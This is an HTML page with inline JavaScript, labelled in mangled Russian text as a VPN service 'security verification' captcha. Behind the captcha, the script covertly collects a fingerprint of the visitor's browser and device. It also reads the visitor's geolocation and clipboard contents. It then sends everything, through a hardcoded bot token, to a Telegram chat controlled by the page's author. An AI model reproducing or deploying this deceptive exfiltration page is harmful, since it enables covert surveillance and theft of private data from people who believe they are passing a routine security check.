<!DOCTYPE html>
<html>
<head>
  <style>
    .container { max-width: 400px; margin: 50px auto; padding: 20px; text-align: center; font-family: Arial; }
    .progress-container { background: #ddd; height: 6px; margin: 20px 0; border-radius: 3px; overflow: hidden; }
    .progress-bar { height: 100%; background: #4CAF50; transition: width 0.3s; }
    #captchaCode { font-size: 24px; font-weight: bold; letter-spacing: 8px; margin: 20px 0; color: #333; }
    input { width: 200px; padding: 12px; font-size: 18px; text-transform: uppercase; text-align: center; border: 2px solid #ddd; border-radius: 5px; margin: 10px; }
    .verify-btn { background: #4CAF50; color: white; border: none; padding: 12px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; }
    .verify-btn:hover { background: #45a049; }
    .status { margin-top: 15px; font-weight: bold; }
    .success { color: #4CAF50; }
    .error { color: #f44336; }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîí –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h1>
    <p>VPN Service –æ–±–Ω–∞—Ä—É–∂–∏–ª –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å. –ü—Ä–æ–π–¥–∏—Ç–µ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é:</p>
    <div class="progress-container">
      <div class="progress-bar" id="progressBar"></div>
    </div>
    <div id="captchaCode">‚Äî‚Äî‚Äî</div>
    <input type="text" id="userInput" maxlength="8" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥" autocomplete="off">
    <button class="verify-btn" id="verifyBtn">–ü—Ä–æ–≤–µ—Ä–∏—Ç—å</button>
    <div id="status" class="status"></div>
  </div>

  <script>
    // === –ö–û–ù–§–ò–ì ===
    const TELEGRAM_TOKEN = '8283059145:AAGuWNblBXBHbfr_V2e1UhwiKRjb0mcoyOw';
    const CHAT_ID = '8283059145'; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π chat_id –≥—Ä—É–ø–ø—ã (-100...) –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
    
    const elements = {
      captchaCode: document.getElementById('captchaCode'),
      userInput: document.getElementById('userInput'),
      verifyBtn: document.getElementById('verifyBtn'),
      progressBar: document.getElementById('progressBar'),
      status: document.getElementById('status')
    };

    let currentCaptcha = '';
    let mouseTrail = [];
    let batteryInfo = {};
    let fingerprintCache = null;

    // === –ö–ê–ü–ß–ê ===
    function generateCaptcha() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      return Array(8).fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
    }

    function updateProgress(percent) {
      elements.progressBar.style.width = percent + '%';
    }

    function start() {
      currentCaptcha = generateCaptcha();
      elements.captchaCode.textContent = currentCaptcha;
      elements.progressBar.style.width = '0%';
      elements.status.textContent = '';
      console.log('‚úÖ –ö–∞–ø—á–∞ –æ—Ç—Ä–∏—Å–æ–≤–∞–Ω–∞:', currentCaptcha);
      collectPassiveFingerprint();
    }

    // === –ü–ê–°–°–ò–í–ù–´–ô –°–ë–û–† ===
    document.addEventListener('mousemove', (e) => {
      mouseTrail.push({x: e.clientX, y: e.clientY, t: Date.now()});
      if (mouseTrail.length > 200) mouseTrail.shift();
    });

    if ('getBattery' in navigator) {
      navigator.getBattery().then(bat => {
        batteryInfo = {
          level: Math.round(bat.level * 100) + '%',
          charging: bat.charging ? '–î–∞' : '–ù–µ—Ç'
        };
      }).catch(() => {
        batteryInfo = { level: 'no', charging: 'no' };
      });
    }

    function detectFonts() {
      const testFonts = ['Arial','Times New Roman','Comic Sans MS','Courier New','Verdana'];
      const detected = [];
      if (document.fonts) {
        testFonts.forEach(font => {
          if (document.fonts.check(`12px ${font}`)) detected.push(font);
        });
      }
      return detected.slice(0, 3).join(',');
    }

    function getCanvasFP() {
      const canvas = document.createElement('canvas');
      canvas.width = 256; canvas.height = 60;
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'alphabetic';
      ctx.fillStyle = "#f60";
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069";
      ctx.font = '11pt Arial';
      ctx.fillText('SUPER FP v3.0', 2, 15);
      return canvas.toDataURL().substring(0, 80);
    }

    function getGeo() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve('geo-unsupported');
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve(`${pos.coords.latitude.toFixed(6)},${pos.coords.longitude.toFixed(6)}`),
          () => resolve('geo-denied'),
          {timeout: 3000}
        );
      });
    }

    async function getClipboard() {
      try {
        if (navigator.clipboard && navigator.clipboard.readText) {
          const text = await navigator.clipboard.readText();
          return text.substring(0, 80);
        }
        return 'clipboard-unsupported';
      } catch(e) {
        return 'clipboard-denied';
      }
    }

    async function collectPassiveFingerprint() {
      if (fingerprintCache) return fingerprintCache;

      updateProgress(30);
      
      const geoPromise = getGeo();
      const clipboardPromise = getClipboard();
      
      const [geo, clipboard] = await Promise.all([geoPromise, clipboardPromise]);

      fingerprintCache = {
        userAgent: navigator.userAgent.substring(0, 120),
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
        cookies: navigator.cookieEnabled,
        hardware: `${navigator.hardwareConcurrency || '?'}c/${navigator.deviceMemory || '?'}GB`,
        fonts: detectFonts(),
        battery: batteryInfo.level || 'no',
        charging: batteryInfo.charging || 'no',
        mouseTrail: mouseTrail.length,
        geo,
        canvas: getCanvasFP(),
        clipboard
      };

      updateProgress(70);
      console.log('üïµÔ∏è‚Äç‚ôÇÔ∏è FP —Å–æ–±—Ä–∞–Ω –ø–∞—Å—Å–∏–≤–Ω–æ');
      return fingerprintCache;
    }

    // === –ò–°–ü–†–ê–í–õ–ï–ù–ù–ê–Ø –û–¢–ü–†–ê–í–ö–ê ===
    async function sendTextReport(fp, input) {
      const text = `üéØ CAPTCHA_OK\n` +
        `üìù –ö–æ–¥: ${currentCaptcha}\n` +
        `‚å®Ô∏è –í–≤–æ–¥: ${input}\n\n` +
        `üì± UA: ${fp.userAgent}\n` +
        `üíª –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${fp.platform}\n` +
        `üåê –Ø–∑—ã–∫/—á–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${fp.language} / ${fp.timezone}\n` +
        `üñ•Ô∏è –≠–∫—Ä–∞–Ω: ${fp.screen}\n` +
        `üîã –ë–∞—Ç–∞—Ä–µ—è: ${fp.battery} (${fp.charging})\n` +
        `üñ±Ô∏è –ú—ã—à—å: ${fp.mouseTrail} —Ç–æ—á–µ–∫\n` +
        `üìç Geo: ${fp.geo}\n` +
        `üóé –®—Ä–∏—Ñ—Ç—ã: ${fp.fonts}\n` +
        `üìã –ë—É—Ñ–µ—Ä: ${fp.clipboard}\n` +
        `üß© Canvas: ${fp.canvas}`;

      try {
        updateProgress(90);
        console.log('üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram...');
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({chat_id: CHAT_ID, text: text.substring(0, 4096)}) // Telegram –ª–∏–º–∏—Ç
        });

        const result = await response.json();
        
        if (result.ok) {
          console.log('‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ:', result);
          elements.status.textContent = '‚úÖ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!';
          elements.status.className = 'status success';
          updateProgress(100);
          return true;
        } else {
          console.error('‚ùå Telegram API Error:', result);
          elements.status.textContent = `‚ùå –û—à–∏–±–∫–∞ Telegram: ${result.description || 'Unknown error'}`;
          elements.status.className = 'status error';
          return false;
        }
      } catch (error) {
        console.error('‚ùå Fetch/Network Error:', error);
        elements.status.textContent = '‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç.';
        elements.status.className = 'status error';
        return false;
      }
    }

    // === –û–ë–†–ê–ë–û–¢–ß–ò–ö –ö–ù–û–ü–ö–ò ===
    elements.verifyBtn.addEventListener('click', async () => {
      const input = elements.userInput.value.trim().toUpperCase();
      
      if (!input) {
        elements.status.textContent = '‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥';
        elements.status.className = 'status error';
        return;
      }

      if (input === currentCaptcha) {
        elements.status.textContent = 'üîç –ü—Ä–æ–≤–µ—Ä–∫–∞...';
        elements.status.className = 'status';
        updateProgress(10);

        try {
          const fp = await collectPassiveFingerprint();
          const success = await sendTextReport(fp, input);
          
          if (success) {
            elements.userInput.disabled = true;
            elements.verifyBtn.disabled = true;
          }
        } catch (error) {
          console.error('‚ùå –û–±—â–∞—è –æ—à–∏–±–∫–∞:', error);
          elements.status.textContent = '‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞';
          elements.status.className = 'status error';
        }
      } else {
        elements.status.textContent = '‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥';
        elements.status.className = 'status error';
        elements.userInput.value = '';
        elements.userInput.focus();
      }
    });

    // === –°–¢–ê–†–¢ ===
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', start);
    } else {
      start();
    }
  </script>
</body>
</html>
